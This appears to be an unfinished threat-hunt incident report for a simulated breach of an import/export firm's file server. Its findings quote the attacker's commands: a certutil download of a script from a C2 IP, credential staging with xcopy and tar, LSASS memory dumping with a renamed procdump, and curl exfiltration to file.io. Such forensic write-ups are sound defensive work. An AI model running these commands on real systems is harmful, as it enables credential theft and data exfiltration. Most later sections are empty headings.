<img width="740" height="1110" alt="image" src="https://github.com/user-attachments/assets/2fb944a4-843c-4169-8b62-f8996a89fcfe" />

# Threat-Hunt-Cargo-Hold

# Index
- [Executive Summary](#executive-summary)
- [Technical Analysis](#technical-analysis)
- [Affected Systems & Data](#affected-systems--data)
- [Evidence Sources & Analysis](#evidence-sources--analysis)
- [Indicators of Compromise (IoCs)](#indicators-of-compromise-iocs)
- [Root Cause Analysis](#root-cause-analysis)
- [Technical Timeline](#technical-timeline)
- [Nature of the Attack](#nature-of-the-attack)
- [Impact Analysis](#impact-analysis)
- [Response and Recovery Analysis](#response-and-recovery-analysis)
- [Immediate Response Actions](#immediate-response-actions)
- [Eradication Measures](#eradication-measures)
- [Recovery Steps](#recovery-steps)
- [Post-Incident Actions](#post-incident-actions)
- [Annex A](#annex-a)
- [Technical Timeline](#technical-timeline-1)

# Executive Summary
## Incident ID:
- INC2025-0011-019

## Incident Severity:
- Severity 1 (Critical)

## Incident Status:
- Resolved

## Incident Overview:
- After establishing initial access on November 19th, network monitoring detected an unauthorized entity returning approximately 72 hours later at precisely `2025-11-22T00:27:58.4166424Z`. Suspicious lateral movement and large data transfers were observed overnight on the file server. Evidence of credential collection and exfiltration of data were followed by actions that allign with persistence for continued privlieges and anti-forensic attempts.

## Key Findings:
Due to a compromised device, the unauthorized entity performed lateral movement and discovered a critical server `azuki-fileserver01` through remote share enumuration. The threat actor then continued to probe for privilege and network enumeration. They then implemented a staging directory and began steps for defensve evasion by attempting to hide the staging directory path through obfuscation. Using legitimate system utilities with network capabilities, the unauthorized entity then weaponized "Living off the Land" techniques to download a script into the staging directory.<br>

The C2 IP address used to download the script `ex.ps1` was identified as `78.141.196.6` to the staging directory `C:\Windows\Logs\CBS\`. Credential file discovery was used for collection and created the file `IT-Admin-Passwords.csv` within the staging directory. The built-in system utility "xcopy.exe" was used in attempt to reduce the chance of detection of security alerts to stage data from the network share `"xcopy.exe" C:\FileShares\IT-Admin C:\Windows\Logs\CBS\it-admin /E /I /H /Y`. The compression tool "tar.exe", which is not native to legacy Windows environments, then was utilized to archive collected data using the command `"tar.exe" -czf C:\Windows\Logs\CBS\credentials.tar.gz -C C:\Windows\Logs\CBS\it-admin .`. In order to avoid signature-base detection, the credential dumping tool was renamed to `pd.exe` and the process memory dump command `"pd.exe" -accepteula -ma 876 C:\Windows\Logs\CBS\lsass.dmp` performed the collection.<br>

Exfiltration steps were then initiated by `"curl.exe" -F file=@C:\Windows\Logs\CBS\credentials.tar.gz https://file.io` which uses the cloud file sharing service file.io. Registry autorun keys were created for persistence with the registry value name `FileShareSync` which used the process `svchost.ps1` to masquerade the malicious files as legitimate Windows components to avoid suspicion. As an attempt at anti-forensics, the malicious actor then targeted the PowerShell command history `ConsoleHost_history.txt` for deletion.

## Immediate Actions:
- The SOC and DFIR teams exclusively managed the incident response procedures internally. Immediate action was taken to isolate the compromised systems from the network through the use of VLAN segmentation. To facilitate a comprehensive investigation, the SOC and DFIR teams gathered extensive data which included network traffic capture files. Additionally, all affected systems were plugged to a host security solution and all event logs were automatically collected by the existing SIEM.

## Stakeholder Impact:
### Customers:
- The credentials of IT accounts were exfiltrated and there is a potential that customer information may have been impacted as well. Potential future impersonations of IT staff and the possibility of customer data being at risk are a possibility. Concerns with confidentiality of customer data is a priority and as a precautionary measure, some services were temporarily taken offline. In addition, some API keys were revoked which may have led to a brief period of downtime for customers. The financial implications of this downtime are currently being assessed but could result in the loss of revenue and customer trust.

### Employees:
- The compromised device `azuki-fileserver01` housed sensitive employee information and has been identified as a major risk to employees. There has been a known remote accessed account `kenji.sato` that has been identified to have been compromised earlier and eventually led to this particular incident. The potential for identity theft, phishing attacks, and unauthorized access is critical.

### Business Partners:
- The fileserver affected by this incident has been known to hold information with business partners and company data. The unintended distribution of proprietary code or technology is concerning. There may have ramifications for business partners who rely on the integrity and exclusivity of Azuki Import/Export Trading CO., LTD.

### Regulatory Bodies:
- The breach of systems could have compliance implications. Regulatory bodies may impose fines or sanctions on Azuki Import/Export Trading CO., LTD for failing to adequately protect sensitive data. This ultimately falls on the jurisdiction and nature of the compromised data.

### Shareholders:
- This incident could have a short-term negative impact on stock prices due to the potential loss of customer trust and possible regulatory fines. Long-term effects will depend on the effectiveness of remedial actions taken and the company's ability to restore stakeholder confidence.

# Technical Analysis
## Affected Systems & Data
Due to insufficient network access controls, the unauthorized entity established initial access and waited (dwell time), before continuing operations. The threat actor successfully gained access over the following:

### Devices:
- `azuki-sl`
- `azuki-fileserver01`
### Accounts:
- `fileadmin`
- `kenji.sato`
  
## Evidence Sources & Analysis
After establishing initial access on November 19, 2025, network monitoring within the SOC detected the attacker returning approximately 72 hours later (`2025-11-22T00:27:58.4166424Z`). Suspicious lateral movement and large data transfers were observed overnight on the file server.

<img width="1168" height="304" alt="image" src="https://github.com/user-attachments/assets/bd9e8334-3d45-45f3-87eb-d2d452ae764d" />

The remote IP `159.26.106.98` made a successful logon to the device `azuki-sl` through the compromised account `kenji.sato` at `2025-11-22T00:27:58.4166424Z`. After this point, suspicious actions were taken and malicious intent were apparent.<br>

<img width="1968" height="498" alt="image" src="https://github.com/user-attachments/assets/ec2d9532-d6c5-46cf-b2e4-656478fc04dd" />

Lateral movement was observed accross many devices which was sourced from a Remote Access Tool (RAT) with the process name `mstsc.exe`.

<img width="1781" height="553" alt="image" src="https://github.com/user-attachments/assets/74724b07-62a7-4bf4-a785-416eb6a43c1b" />

Queries for the any remote sessions with successful logon attempts discovered suspicious activity involving the critical fileserver `azuki-fileserver01`.

<img width="1816" height="488" alt="image" src="https://github.com/user-attachments/assets/fcc5792a-a78c-44de-9fa7-00a9b9c77d53" />



----------------------------------------------------------------------------------------------------------------------------------------------------------------------------

The earliest signs of malicious command execution point to the unauthorized download of a suspicious script by using legitimate system utilities with network access.

<img width="1312" height="362" alt="image" src="https://github.com/user-attachments/assets/bdfc9daa-9aa9-45d9-a224-d1e78b632100" />

The PowerShell script `ex.ps1` was downloaded at using the command `"certutil.exe" -urlcache -f http://78.141.196.6:7331/ex.ps1` which also established the first contact of the C2 server `78.141.196.6`.<br>

From the logs, the PowerShell script `ex.ps1` was downloaded into the staging directory `C:\Windows\Logs\CBS\` through the IP address `78.141.196.6`. The script then triggered events that collected credentials, prepared the data for exfiltration, and exfiltrated the stolen data through a cloud service. Evidence of persistence was found in the form of an obfuscated PowerShell file `svchost.ps1`. Anti-forensic attempts were apparent by the deletion of the PowerShell history file `ConsoleHost_history.txt`.<br>

## Indicators of Compromise (IoCs)
### C2 IP:
## Root Cause Analysis

# Technical Timeline
## Initial Compromise
## Lateral Movement
## Data Access & Exfiltration
## C2 Communications
## Malware Deployment or Activity
## Containment Times
## Eradication Times
## Recovery Times

# Nature of the Attack

## Data Access & Exfiltration

## C2 Communications

## Containment Times

## Eradication Times

## Nature of the Attack


# Impact Analysis

# Response and Recovery Analysis

# Immediate Response Actions
## Revocation of Access
### Identification of Compromised Accounts / Systems:
### Timeframe:
### Method of Revocation:
### Impact:
## Containment Strategy
### Short-Term Containment:
### Long-Term Containment:
### Effectiveness:

# Eradication Measures
## Malware Removal:
## System Patching:
### Vulnerability Identification:
### Patch Management:
### Fallback Proceedures:

# Recovery Steps
## Data Restoration
### Backup Validation:
### Restoration Process:
### Data Integrity Checks:
## System Validation
### Security Measures:
### Operational Checks:

# Post-Incident Actions
## Monitoring
### Enhanced Monitoring Plans:
### Tools and Technologies:
## Lessons Learned
### Gap Analysis:
### Recommendations for Improvement:
### Future Strategy:

# Annex A

# Technical Timeline
|      Time      |                                                              Activity                                                              |
|----------------|------------------------------------------------------------------------------------------------------------------------------------|
|                |                                                                                                                                    |
|                |                                                                                                                                    |
|                |                                                                                                                                    |
|                |                                                                                                                                    |
|                |                                                                                                                                    |
|                |                                                                                                                                    |
|                |                                                                                                                                    |
|                |                                                                                                                                    |
|                |                                                                                                                                    |
|                |                                                                                                                                    |
|                |                                                                                                                                    |
|                |                                                                                                                                    |
|                |                                                                                                                                    |
|                |                                                                                                                                    |
|                |                                                                                                                                    |
|                |                                                                                                                                    |
|                |                                                                                                                                    |
|                |                                                                                                                                    |
